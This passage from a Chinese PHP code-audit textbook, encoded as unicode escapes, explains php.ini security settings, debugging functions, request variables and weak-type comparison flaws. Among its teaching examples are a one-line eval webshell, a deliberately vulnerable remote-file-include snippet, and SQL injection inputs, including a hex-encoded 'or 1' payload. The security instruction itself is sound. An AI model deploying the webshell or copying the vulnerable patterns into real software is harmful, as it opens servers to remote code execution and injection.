82\u4E0B\uFF1A\r
\r
\r
\r
open_basedir = .:/tmp/\r
\r
\r
\r
### 2.1.5 \u9B54\u672F\u5F15\u53F7\u53CA\u8FDC\u7A0B\u6587\u4EF6\u76F8\u5173\u914D\u7F6E\r
\r
1\u3001magic_quotes_gpc\uFF08\u9B54\u672F\u5F15\u53F7\u81EA\u52A8\u8FC7\u6EE4\u914D\u7F6E\uFF0C\u7B80\u79F0\u201CGPC\u201D\uFF09\r
\r
\u8BE5\u914D\u7F6E\u5728\u5F00\u542F\u60C5\u51B5\u4E0B\uFF0C\u53EF\u5BF9GET\u3001POST\u3001COOKIE\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002\u8FC7\u6EE4\u7684\u7B26\u53F7\u5305\u62EC\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001\u53CD\u659C\u6760\u3001\u7A7A\u5B57\u7B26\uFF0C\u5C06\u4E0A\u8FF0\u5B57\u7B26\u524D\u81EA\u52A8\u6DFB\u52A0\u53CD\u659C\u6760\uFF08\\\uFF09\u4ECE\u800C\u6270\u65AD\u6076\u610F\u811A\u672C\u4EE3\u7801\u6267\u884C\u3002\u8BE5\u914D\u7F6E\u53C2\u6570\u53EF\u666E\u904D\u9632\u5FA1SQL\u6CE8\u5165\u3001XSS\u6F0F\u6D1E\u7B49\u6076\u610F\u811A\u672C\u7684\u6267\u884C\uFF08\u5982\u679C\u4F7F\u7528\u7F16\u7801\u7ED5\u8FC7\u6216\u5176\u4ED6\u7279\u6B8A\u65B9\u5F0F\u7ED5\u8FC7\u5219\u65E0\u6CD5\u9632\u5FA1\uFF09\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6D4B\u8BD5\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php \r
\r
echo $_GET['a'].'</br>';\r
\r
echo urldecode($_SERVER['HTTP_REFERER']);\r
\r
?>\r
\r
\r
\r
magic_quotes_gpc\u914D\u7F6E\u5F00\u542F\u540E\uFF0C\u4F7F\u7528GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570a\u503C\u4E3A\uFF1A1' and 1=1\\"\uFF0C\u5982\u56FE2-3\u6240\u793A\u3002\u53EF\u4EE5\u53D1\u73B0\u5355\u5F15\u53F7\u3001\u53CD\u659C\u6760\u53CA\u53CC\u5F15\u53F7\u5DF2\u7ECF\u81EA\u52A8\u52A0\u4E0A\u53CD\u659C\u6760\u3002\u6CE8\u610F\uFF1A\u8BE5\u914D\u7F6E\u4E0D\u80FD\u8FC7\u6EE4$_SERVER\u4F20\u9012\u53C2\u6570\uFF0C\u4F8B\u5982\uFF1AHTTP_X_FORWARDED_FOR\u3001HTTP_REFERER\u7B49\u53C2\u6570\u90FD\u4E0D\u652F\u6301\u8FC7\u6EE4\u3002\uFF08\u8BE5\u914D\u7F6E\u81EAPHP5.4\u7248\u672C\u540E\u5E9F\u5F03\u4F7F\u7528\uFF0C\u672C\u4E66\u4F7F\u7528\u7248\u672C\u4E3APHP5.2.17\uFF09\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image132.jpg)\r
\r
\u56FE2-3 magic_quotes_gpc\u914D\u7F6E\u6D4B\u8BD5\u56FE\r
\r
\u4E0Emagic_quotes_gpc\u7C7B\u4F3C\u7684\u914D\u7F6E\u4E3Amagic_quotes_sybase\u3002\u4E0A\u8FF0\u4E24\u79CD\u914D\u7F6E\u90FD\u53EF\u8FC7\u6EE4HTTP\u4E2DGET\u3001POST\u3001Cookie\u7B49\u4F20\u9012\u7684\u53C2\u6570\uFF0C\u4F46\u662F\u4E24\u8005\u8FC7\u6EE4\u7684\u6548\u679C\u6709\u6240\u4E0D\u540C\u3002magic_quotes_sybase\u53EA\u80FD\u5C06\u7A7A\u5B57\u7B26\u548C\u5355\u5F15\u53F7\u8F6C\u6362\u4E3A\u53CC\u5F15\u53F7\u3002\u5F53magic_quotes_sybase\u8BBE\u7F6E\u4E3Aon\u4EE5\u540E\uFF0Cmagic_quotes_gpc\u914D\u7F6E\u7684\u529F\u80FD\u5C06\u88AB\u8986\u76D6\u3002\r
\r
2\u3001magic_quotes_runtime\uFF08\u9B54\u672F\u5F15\u53F7\u81EA\u52A8\u8FC7\u6EE4\u914D\u7F6E\uFF09\r
\r
\u8BE5\u914D\u7F6E\u4E0E\u9009\u9879magic_quotes_gpc\u8FC7\u6EE4\u6548\u679C\u7C7B\u4F3C\uFF0C\u90FD\u53EF\u5C06\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001\u53CD\u659C\u6760\u3001\u7A7A\u5B57\u7B26\u7ECF\u8FC7\u6EE4\u540E\u81EA\u52A8\u52A0\u4E0A\u53CD\u659C\u6760\u3002\u552F\u4E00\u4E0D\u540C\u7684\u662Fmagic_quotes_gpc\u9009\u9879\u53EA\u80FD\u8FC7\u6EE4\u7ECF\u8FC7HTTP\u8BF7\u6C42\u4F20\u9012\u6765\u7684\u53C2\u6570\uFF0C\u800Cmagic_quotes_runtime\u53EF\u8FC7\u6EE4\u6587\u4EF6\u6216\u6570\u636E\u5E93\u4E2D\u83B7\u53D6\u7684\u6570\u636E\u3002\u8BE5\u914D\u7F6E\u7684\u5F00\u542F\u53EF\u4EE5\u6709\u6548\u9632\u6B62\u4ECE\u6570\u636E\u5E93\u83B7\u53D6\u6076\u610F\u811A\u672C\u6267\u884C\u7684\u653B\u51FB\u65B9\u5F0F\uFF0C\u4F8B\u5982\uFF1A\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3002\uFF08\u8BE5\u914D\u7F6E\u81EAPHP5.4\u7248\u672C\u540E\u5E9F\u5F03\u4F7F\u7528\uFF0C\u672C\u4E66\u4F7F\u7528\u7248\u672C\u4E3APHP5.2.17\uFF09\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6D4B\u8BD5\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
ini_set("magic_quotes_runtime","1");\r
\r
echo file_get_contents("test.txt");\r
\r
?>\r
\r
\r
\r
\u6D4B\u8BD5\u6587\u4EF6test.txt\u5185\u5BB9\u4E3A\u4E00\u53E5\u8BDD\u6728\u9A6C\u5982\u4E0B\uFF1A\r
\r
\r
\r
@eval($_POST['Cknife']);\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\u5982\u56FE2-4\u6240\u793A\uFF0Ctest.txt\u6587\u4EF6\u4E2D\u7684\u5185\u5BB9\u5728\u5355\u5F15\u53F7\u524D\u81EA\u52A8\u6DFB\u52A0\u4E86\u53CD\u659C\u6760\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image134.jpg)\r
\r
\u56FE2-4 magic_quotes_runtime\u914D\u7F6E\u6D4B\u8BD5\u56FE\r
\r
3\u3001allow_url_include\uFF08\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u914D\u7F6E\uFF09\r
\r
\u8BE5\u914D\u7F6E\u53EF\u4EE5\u63A7\u5236\u662F\u5426\u5141\u8BB8\u8FDC\u7A0B\u6587\u4EF6\u8BBF\u95EE\uFF0C\u8BE5\u914D\u7F6E\u5C06\u76F4\u63A5\u5F71\u54CD\u201C\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u201D\u6F0F\u6D1E\u7684\u6267\u884C\u6548\u679C\uFF0C\u5728PHP5.2.0\u7248\u672C\u540E\u9ED8\u8BA4\u8BE5\u914D\u7F6E\u5904\u4E8E\u5173\u95ED\u72B6\u6001\u3002\r
\r
\u5F00\u542F\u8BE5\u914D\u7F6E\u53C2\u6570\uFF0C\u5E76\u7ED9\u51FA\u6D4B\u8BD5\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php include $_GET['a']; ?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6267\u884C\u6548\u679C\u5982\u56FE2-5\u6240\u793A\u3002\u901A\u8FC7\u4FEE\u6539\u5BF9\u7AEF\u670D\u52A1\u5668\u7684\u4F20\u9012\u53C2\u6570\u201Ca\u201D\u4E3A\u5176\u4ED6\u7F51\u5740\u8DEF\u5F84\uFF0C\u4ECE\u800C\u63A7\u5236\u670D\u52A1\u5668\u8BBF\u95EE\u5176\u4ED6\u7F51\u5740\u6216\u5176\u4ED6\u670D\u52A1\u5668\u5185\u90E8\u6587\u4EF6\u3002\u4E25\u91CD\u60C5\u51B5\u4E0B\uFF0C\u8BE5\u6F0F\u6D1E\u53EF\u63A7\u5236\u670D\u52A1\u5668\u8BBF\u95EE\u8FDC\u7A0B\u6728\u9A6C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image136.jpg)\r
\r
\u56FE2-5 allow_url_include\u914D\u7F6E\u6D4B\u8BD5\u56FE\r
\r
\u4E0Eallow_url_include\u914D\u7F6E\u7C7B\u4F3C\u7684\u8FD8\u6709allow_url_fopen\uFF0C\u901A\u8FC7\u5F00\u542F\u8BE5\u914D\u7F6E\u53EF\u4EE5\u8BBE\u7F6E\u662F\u5426\u5141\u8BB8\u6253\u5F00\u8FDC\u7A0B\u6587\u4EF6\u3002\r
\r
### 2.1.6 \u9519\u8BEF\u4FE1\u606F\u76F8\u5173\u914D\u7F6E\r
\r
  \u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u901A\u5E38\u9700\u8981\u8BBE\u7F6E\u7A0B\u5E8F\u9519\u8BEF\u65E5\u5FD7\u7684\u5F00\u542F\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u7A0B\u5E8F\u9519\u8BEF\u4FE1\u606F\u914D\u7F6E\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
1\u3001\u9519\u8BEF\u4FE1\u606F\u63A7\u5236\r
\r
php.ini\u4E2D\u53C2\u6570display_error\u7528\u6765\u8BBE\u7F6E\u5C06\u9519\u8BEF\u4FE1\u606F\u4F5C\u4E3A\u7A0B\u5E8F\u8F93\u51FA\uFF0C\u5728\u7AD9\u70B9\u53D1\u5E03\u540E\u5E94\u5C06\u8BE5\u529F\u80FD\u5173\u95ED\uFF0C\u9632\u6B62\u4FE1\u606F\u6CC4\u9732\u3002\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5E94\u5C06\u8BE5\u529F\u80FD\u6253\u5F00\uFF0C\u5229\u7528\u8C03\u8BD5\u7A0B\u5E8F\u4EE3\u7801\u3002\r
\r
2\u3001\u8BBE\u7F6E\u9519\u8BEF\u62A5\u544A\u7EA7\u522B\r
\r
php.ini\u4E2D\u53C2\u6570error_reporting\u7528\u6765\u8BBE\u7F6E\u9519\u8BEF\u4FE1\u606F\u663E\u793A\u7EA7\u522B\uFF0C\u9519\u8BEF\u4FE1\u606F\u7EA7\u522B\u5305\u62EC\uFF1AE_ALL\u3001E_ERROR\u3001E_RECOVERABLE_ERROR\u3001E_WARNING\u3001E_PARSE\u3001E_NOTICE\u7B49\u3002\u4EE3\u7801\u662F\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5C06\u8BE5\u914D\u7F6E\u53C2\u6570\u8BBE\u7F6E\u4E3A\u6700\u9AD8\u7EA7\u522B\u53EF\u4EE5\u663E\u793A\u6240\u6709\u95EE\u9898\u4E14\u65B9\u4FBF\u5DEE\u9519\uFF0C\u63A8\u8350\u4F7F\u7528\u7684\u914D\u7F6E\u4E3A\uFF1AE_ALL\u6216E_STRICT\uFF08\u5373\u6240\u6709\u7EA7\u522B\u663E\u793A\uFF09\u3002\r
\r
3\u3001\u9519\u8BEF\u65E5\u5FD7\r
\r
\u5F00\u542F\u9519\u8BEF\u65E5\u5FD7\u8BB0\u5F55\u529F\u80FD\u4EE5\u540E\uFF0C\u9700\u8981\u4E3A\u9519\u8BEF\u65E5\u5FD7\u53C2\u6570\u8FDB\u884C\u914D\u7F6E\uFF0C\u5176\u914D\u7F6E\u53C2\u6570\u5305\u62EC\uFF1A\r
\r
l error_log\uFF1A\u5B9A\u4E49\u9519\u8BEF\u4FE1\u606F\u4F4D\u7F6E\uFF0C\u9700\u5BF9Web\u7528\u6237\u6709\u5199\u5165\u6743\u9650\uFF0C\u5982\u679C\u4E0D\u5B9A\u4E49\u5219\u9ED8\u8BA4\u5199\u5165\u5230Web\u670D\u52A1\u5668\u7684\u9519\u8BEF\u65E5\u5FD7\u4E2D\u3002\r
\r
l log_errors\uFF1A\u5B9A\u4E49\u9519\u8BEF\u65E5\u5FD7\u662F\u5426\u5F00\u542F\u3002\r
\r
l log_errors_max_length\uFF1A\u5B9A\u4E49\u9519\u8BEF\u65E5\u5FD7\u5173\u8054\u4FE1\u606F\u7684\u6700\u5927\u957F\u5EA6\uFF0C\u82E5\u8BBE\u4E3A0\u5219\u8868\u793A\u65E0\u9650\u957F\u5EA6\u3002\r
\r
## 2.2 \u4EE3\u7801\u5BA1\u8BA1\u57FA\u672C\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u5C06\u4ECB\u7ECD\u5B66\u4E60\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u7ECF\u5E38\u4F7F\u7528\u7684\u57FA\u672C\u51FD\u6570\uFF0C\u5305\u62EC\uFF1A\u8C03\u8BD5\u51FD\u6570\u3001\u53C2\u6570\u4F20\u9012\u51FD\u6570\u3001\u7CFB\u7EDF\u73AF\u5883\u53D8\u91CF\u3002\r
\r
### 2.2.1 \u4EE3\u7801\u8C03\u8BD5\u51FD\u6570\r
\r
\u4EE3\u7801\u8C03\u8BD5\u51FD\u6570\u7ECF\u5E38\u53EF\u4EE5\u7528\u6765\u6253\u5370\u53D8\u91CF\u7684\u72B6\u6001\u548C\u6570\u636E\u7ED3\u6784\u7B49\u4FE1\u606F\u3002\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5982\u679C\u53D1\u73B0\u67D0\u6BB5\u4EE3\u7801\u903B\u8F91\u8F83\u4E3A\u590D\u6742\uFF0C\u6216\u5BF9\u67D0\u4E2A\u53C2\u6570\u503C\u5B58\u5728\u7591\u60D1\u65F6\uFF0C\u53EF\u4EE5\u5728\u7A0B\u5E8F\u4EE3\u7801\u4E2D\u52A0\u5165\u4EE3\u7801\u53C2\u6570\u6253\u5370\u51FD\u6570\uFF0C\u5C06\u6709\u7591\u60D1\u7684\u53C2\u6570\u503C\u8FDB\u884C\u6253\u5370\u3002\u540C\u65F6\u8FD8\u53EF\u4EE5\u4F7F\u7528\u7279\u5B9A\u51FD\u6570\u83B7\u53D6\u5F53\u524D\u7CFB\u7EDF\u8FDB\u7A0B\u7684\u7C7B\u3001\u51FD\u6570\u3001\u5E38\u91CF\u3001\u53D8\u91CF\u3002\r
\r
1\uFF0E\u72B6\u6001\u53C2\u6570\u6253\u5370\u51FD\u6570\r
\r
\u4EE3\u7801\u8C03\u8BD5\u51FD\u6570\u4E2D\u53EF\u6253\u5370\u53C2\u6570\u503C\u6216\u72B6\u6001\u7684\u51FD\u6570\u5305\u62EC\uFF1Aecho\u3001print_r\u3001var_dump\u3001exit\u3001die\u7B49\u3002\r
\r
l echo\uFF1A\u7528\u4E8E\u8F93\u51FA\u5B57\u7B26\u4E32\u6216\u53D8\u91CF\u7684\u503C\uFF08\u4E0D\u80FD\u8F93\u51FA\u6570\u7EC4\u7684\u503C\uFF09\u3002\r
\r
l print_r()\uFF1A\u7528\u4E8E\u8F93\u51FA\u4E00\u4E2A\u6570\u7EC4\u7684\u503C\u3002\r
\r
l var_dump()\uFF1A\u8F93\u51FA\u4E00\u4E2A\u53D8\u91CF\u7684\u7ED3\u6784\uFF0C\u8BE5\u53D8\u91CF\u5305\u62EC\uFF1A\u666E\u901A\u53D8\u91CF\u3001\u6570\u7EC4\u3001\u5BF9\u8C61\u7684\u53C2\u6570\u3002\r
\r
l exit\u6216die\uFF1A\u8F93\u51FA\u6D88\u606F\u5E76\u505C\u6B62\u7A0B\u5E8F\u6267\u884C\u6D41\u7A0B\u3002\r
\r
2.\u83B7\u53D6\u5F53\u524D\u8FDB\u7A0B\u6240\u6709\u53D8\u91CF\u3001\u51FD\u6570\u3001\u5E38\u91CF\u3001\u7C7B\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u901A\u5E38\u5BF9\u67D0\u4E9B\u503C\u4EA7\u751F\u7591\u60D1\uFF0C\u8FD9\u53EF\u80FD\u662F\u7A0B\u5E8F\u4E2D\u67D0\u5904\u5DF2\u5B9A\u4E49\u8FC7\u7684\u53D8\u91CF\u6216\u51FD\u6570\uFF0C\u5728\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u6709\u9057\u6F0F\uFF0C\u8FD9\u5C31\u9700\u8981\u5C06\u7A0B\u5E8F\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u5F53\u524D\u8FDB\u7A0B\u7684\u51FD\u6570\u53D8\u91CF\u8FDB\u884C\u6253\u5370\uFF0C\u8FD9\u4E9B\u65B9\u6CD5\u5305\u62EC\uFF1Aget_defined_vars(void)\u3001$GLOBALS\u3001get_defined_functions\u3001get_defined_contants\u3001get_include_files\u3001get_declared_classes\u7B49\u3002\r
\r
l $GLOBALS\uFF1APHP\u4E2D\u6709\u4E00\u4E2A\u4E0D\u4E3A\u5F88\u591A\u4EBA\u6240\u7528\u7684\u8D85\u5168\u5C40\u53D8\u91CF$GLOBALS\u3002\u5408\u7406\u4F7F\u7528\u8FD9\u4E2A\u53D8\u91CF\u80FD\u4F7F\u5DE5\u4F5C\u53D8\u5F97\u66F4\u52A0\u6709\u6548\u7387\uFF0C$GLOBALS\u5F15\u7528\u5168\u5C40\u4F5C\u7528\u57DF\u4E2D\u53EF\u7528\u7684\u5168\u90E8\u53D8\u91CF\uFF08\u4E00\u4E2A\u5305\u542B\u4E86\u5168\u90E8\u53D8\u91CF\u7684\u5168\u5C40\u7EC4\u5408\u6570\u7EC4\uFF09\uFF0C\u4E0E\u6240\u6709\u5176\u4ED6\u8D85\u5168\u5C40\u53D8\u91CF\u4E0D\u540C\uFF0C$GLOBALS\u5728PHP\u4EE3\u7801\u4E2D\u4EFB\u4F55\u5730\u65B9\u603B\u662F\u53EF\u7528\u7684\u3002\r
\r
l array get_defined_vars(void)\uFF1A\u6B64\u51FD\u6570\u8FD4\u56DE\u4E00\u4E2A\u5305\u542B\u6240\u6709\u5DF2\u5B9A\u4E49\u53D8\u91CF\u5217\u8868\u7684\u591A\u7EF4\u6570\u7EC4\uFF0C\u8FD9\u4E9B\u53D8\u91CF\u5305\u62EC\u73AF\u5883\u53D8\u91CF\u3001\u670D\u52A1\u5668\u53D8\u91CF\u548C\u7528\u6237\u5B9A\u4E49\u7684\u53D8\u91CF\u3002\u4F8B\u5982\uFF1A\r
\r
\r
\r
<?php\r
\r
$b = array(1,1,2,3,5,8);\r
\r
$arr = get_defined_vars();\r
\r
print_r($arr["b"]);    // \u901A\u8FC7get_defined_vars\u51FD\u6570\u76F4\u63A5\u6253\u5370 $b\u53D8\u91CF\r
\r
// \u4F8B\u5982\uFF1A/usr/local/bin/php\r
\r
echo $arr["_"];  // \u6253\u5370 PHP \u89E3\u91CA\u7A0B\u5E8F\u7684\u8DEF\u5F84\uFF08\u5982\u679C PHP \u4F5C\u4E3A CGI \u4F7F\u7528\u7684\u8BDD\uFF09\r
\r
print_r($arr["argv"]); // \u6253\u5370\u547D\u4EE4\u884C\u53C2\u6570\uFF08\u5982\u679C\u6709\u7684\u8BDD\uFF09\r
\r
print_r($arr["_SERVER"]); // \u6253\u5370\u6240\u6709\u670D\u52A1\u5668\u53D8\u91CF\r
\r
print_r(array_keys(get_defined_vars())); // \u6253\u5370\u53D8\u91CF\u6570\u7EC4\u7684\u6240\u6709\u53EF\u7528\u952E\u503C\r
\r
?>\r
\r
\r
\r
l get_defined_functions(void)\uFF1A\u83B7\u53D6\u6240\u6709\u5DF2\u5B9A\u4E49\u7684\u51FD\u6570\uFF0C\u5305\u62EC\u5185\u90E8\u51FD\u6570\u548C\u7528\u6237\u5B9A\u4E49\u51FD\u6570\uFF0C\u4F8B\u5982\uFF1A\r
\r
\r
\r
<?php\r
\r
function myrow($id, $data)\r
\r
{return "<tr><th>$id</th><td>$data</td></tr>\\n";}\r
\r
$arr = get_defined_functions();\r
\r
print_r($arr);  //\u5C06\u5DF2\u5B9A\u4E49\u7684\u51FD\u6570\u6253\u5370[user] => Array ( [0] => myrow)\r
\r
?>\r
\r
\r
\r
l get_defined_constants(void)\uFF1A\u8FD4\u56DE\u53EF\u7528\u5E38\u91CF\uFF0C\u5305\u62EC\uFF1A\u7CFB\u7EDF\u5E38\u91CF\u548C\u7528\u6237\u5B9A\u4E49\u5E38\u91CF\u3002\r
\r
l get_include_files()\uFF1A\u8FD4\u56DE\u5305\u542B\u7684\u6587\u4EF6\u8DEF\u5F84\u7684\u6570\u7EC4\uFF08\u4F7F\u7528include\u51FD\u6570\u548Crequire\u51FD\u6570\u5305\u542B\u7684\uFF09\u3002\r
\r
l get_declared_classes(void)\uFF1A\u8FD4\u56DE\u6240\u6709\u53EF\u7528\u7C7B\uFF0C\u5305\u62EC\uFF1A\u7CFB\u7EDF\u7C7B\u548C\u7528\u6237\u5B9A\u4E49\u7684\u7C7B\u3002\r
\r
### 2.2.2 \u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u7684\u70B9\r
\r
\u5F88\u591A\u7684\u5B89\u5168\u6F0F\u6D1E\u90FD\u662F\u7531\u4E8E\u53C2\u6570\u7684\u8FC7\u6EE4\u4E0D\u4E25\u5BFC\u81F4\u7684\uFF0C\u5728\u7F51\u7AD9\u4E2D\u53C2\u6570\u7684\u83B7\u5F97\u901A\u5E38\u5305\u62EC\uFF1AHTTP\u5934\u3001HTTP\u8BF7\u6C42\u53C2\u6570\u3001\u7CFB\u7EDF\u73AF\u5883\u53D8\u91CF\uFF0C\u4E0B\u9762\u5BF9\u8FD9\u51E0\u79CD\u4EE3\u7801\u5F62\u5F0F\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
l $_SERVER\r
\r
$_SERVER \u662F\u5305\u542B\u4E86HTTP\u5934\u4FE1\u606F\u3001\u8DEF\u5F84\u3001\u811A\u672C\u4F4D\u7F6E\u7B49\u4FE1\u606F\u7684\u6570\u7EC4\uFF0C\u8BE5\u6570\u7EC4\u4E2D\u7684\u9879\u76EE\u7531Web\u670D\u52A1\u5668\u521B\u5EFA\u3002\u5F88\u591A\u5B89\u5168\u6F0F\u6D1E\u7684\u6F0F\u6D1E\u70B9\u90FD\u662F\u4ECE$_SERVER\u53D8\u91CF\u4E2D\u83B7\u53D6\uFF0C\u4F8B\u5982\uFF1A\u57FA\u4E8EHTTP\u5934\u7684SQL\u6CE8\u5165\u7B49\u3002\r
\r
$_SERVER\u53EF\u4EE5\u83B7\u53D6\u7684\u4FE1\u606F\u5305\u62EC\uFF1A\r
\r
  $_SERVER[\u2018HTTP_HOST\u2019]\uFF1A\u83B7\u53D6\u7389\u660E\u6216\u4E3B\u673A\u540D\u5730\u5740\r
\r
  $_SERVER[\u2018HTTP_X_FOREARDED_FOR\u2019]\uFF1A\u83B7\u53D6\u539F\u59CB\u5BA2\u6237\u7AEFIP\u5730\u5740\r
\r
  $_SERVER[\u2018PHP_SELF\u2019]\uFF1A\u8FD4\u56DE\u5F53\u524D\u6267\u884C\u811A\u672C\u6587\u4EF6\u540D\r
\r
  $_SERVER[\u2018QUERY_STRING\u2019]\uFF1A\u83B7\u53D6\u7F51\u5740\u53C2\u6570\r
\r
  $_SERVER[\u2018HTTP_USER_AGENT\u2019]\uFF1A\u83B7\u53D6\u7528\u6237\u7684User-Agent\r
\r
  $_SERVER[\u2018HTTP_REFERER\u2019]\uFF1A\u83B7\u53D6\u7528\u6237\u6765\u6E90\r
\r
l HTTP\u8BF7\u6C42\u53C2\u6570\r
\r
  $_REQUEST\uFF1A\u63A5\u6536\u5404\u79CDHTTP\u8BF7\u6C42\u65B9\u6CD5\r
\r
  $_GET\uFF1A\u63A5\u6536HTTP\u7684GET\u8BF7\u6C42\u65B9\u6CD5\r
\r
  $_POST\uFF1A\u63A5\u6536HTTP\u7684POST\u8BF7\u6C42\u65B9\u6CD5\r
\r
  $_FILES\uFF1A\u6587\u4EF6\u4E0A\u4F20\u76F8\u5173\r
\r
l $_ENV\r
\r
$_ENV\u6709\u540D\u4E3A\u7CFB\u7EDF\u73AF\u5883\u53D8\u91CF\uFF0C\u5B83\u662F\u4E00\u4E2A\u5305\u542B\u670D\u52A1\u5668\u7AEF\u73AF\u5883\u53D8\u91CF\u7684\u6570\u7EC4\uFF0C\u662FPHP\u4E2D\u7684\u4E00\u4E2A\u8D85\u7EA7\u5168\u5C40\u53D8\u91CF\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5728PHP\u7684\u4EFB\u610F\u5730\u65B9\u76F4\u63A5\u8BBF\u95EE$_ENV\u3002$_ENV\u7684\u8F93\u51FA\u65B9\u6CD5\u5305\u62EC\uFF1A\r
\r
  var_dump($_ENV);\r
\r
  print_r($_ENV);\r
\r
  foreach($_ENV as $key=>$val){echo $key.$val;}\r
\r
## 2.3 \u5F31\u7C7B\u578B\u7684\u5B89\u5168\r
\r
PHP\u8FDB\u884C\u5F31\u7C7B\u578B\u6570\u636E\u6BD4\u8F83\u8FC7\u7A0B\u4E2D\uFF0C\u901A\u5E38\u90FD\u5B58\u5728\u5916\u6765\u6570\u636E\u53D8\u91CF\u5F31\u7C7B\u578B\u8F6C\u6362\u7684\u95EE\u9898\uFF0C\u8FD9\u5BFC\u81F4\u8F6C\u6362\u540E\u7684\u6570\u636E\u8FDB\u5165\u5230\u5224\u65AD\u6761\u4EF6\u4F53\u5185\uFF0C\u8FD9\u6781\u53EF\u80FD\u5BFC\u81F4\u5B89\u5168\u95EE\u9898\u3002\u672C\u5C0F\u8282\u5C06\u5BF9PHP\u4EE3\u7801\u4E2D\u5E38\u89C1\u7684\u5F31\u7C7B\u578B\u6BD4\u8F83\u3001\u7F16\u7801\u7ED5\u8FC7\u60C5\u51B5\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u4ECE\u800C\u52A0\u5F3APHP\u4EE3\u7801\u5BA1\u8BA1\u5B89\u5168\u610F\u8BC6\u3002\r
\r
PHP\u7684\u5F31\u7C7B\u578B\u5224\u65AD\u6BD4\u8F83\u7684\u51FD\u6570\u5305\u62EC\uFF1Ais_numeric()\u3001in_array()\u3001strcmp()\u3001\u53CC\u7B49\u4E8E\u5224\u65AD\u3001strpos()\u3002\r
\r
\uFF081\uFF09  is_numeric\u51FD\u6570\r
\r
is_numeric\u51FD\u6570\u7684\u4F5C\u7528\u662F\u68C0\u6D4B\u53D8\u91CF\u662F\u5426\u4E3A\u6570\u5B57\uFF0C\u5982\u679C\u662F\u6570\u5B57\u5219\u8FD4\u56DEtrue\u3001\u5426\u5219\u8FD4\u56DEfalse\u3002\r
\r
\u8BE5\u51FD\u6570\u7684\u5F31\u7C7B\u578B\u95EE\u9898\u662F\u5176\u652F\u6301\u5341\u516D\u8FDB\u52360x\u683C\u5F0F\uFF0C\u653B\u51FB\u8005\u628APayload\u6539\u6210\u5341\u516D\u8FDB\u52360x\u5F62\u5F0F\u540E\uFF0Cis_numeric\u4F1A\u5148\u5224\u65AD\u5341\u516D\u8FDB\u5236\u662F\u5426\u4E3A\u6570\u5B57\u578B\uFF0C\u5982\u679C\u662F\u5219\u8FD4\u56DE\u771F\uFF0C\u4ECE\u800C\u8FDB\u5165\u4E86\u6761\u4EF6\u8BED\u53E5\u3002\u5982\u679C\u518D\u628A\u8BE5Payload\u4EE3\u5165\u5230SQL\u8BED\u53E5\u4E2D\u5219\u8FDB\u5165MySQL\u6570\u636E\u5E93\uFF0CMySQL\u6570\u636E\u5E93\u4F1A\u5BF9HEX\u8FDB\u884C\u89E3\u6790\u6210\u5B57\u7B26\u4E32\u5B58\u5165\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u5982\u679C\u8FD9\u4E2A\u5B57\u6BB5\u518D\u88AB\u53D6\u51FA\u6765\u4E8C\u6B21\u5229\u7528\uFF0C\u5C31\u53EF\u80FD\u5BFC\u81F4\u4E8C\u6B21\u6CE8\u5165\u3001XSS\u7B49\u5B89\u5168\u6F0F\u6D1E\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FAis_numeric\u51FD\u6570\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$type= **is_numeric**($_GET['id'])?$_GET['id']:0;\r
\r
$sql="insert into test(id,type)values(1,$type);";\r
\r
echo $sql;\r
\r
?>\r
\r
\r
\r
\u4F7F\u7528HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570id\u4E3A0x31206f722031 \uFF08\u8BE5\u503C\u662F\u20181 or 1\u2019\u768416\u8F6C\u6362\u8F6C\u6362\u7ED3\u679C\uFF09\uFF0C\u4F7F\u7528\u8BE5\u53C2\u6570\u8FDB\u884C\u6570\u636E\u5E93\u67E5\u8BE2\uFF0C\u5176\u7ED3\u679C\u5982\u56FE2-6\u6240\u793A\u3002\u5982\u679C\u518D\u91CD\u65B0\u67E5\u8BE2\u8FD9\u4E2A\u8868\u7684\u5B57\u6BB5\uFF0C\u4E0D\u505A\u8FC7\u6EE4\u5E26\u5165\u53E6\u4E00\u4E2ASQL\u8BED\u53E5\uFF0C\u5C06\u4F1A\u9020\u6210\u4E8C\u6B21\u6CE8\u5165\u3002\r
\r
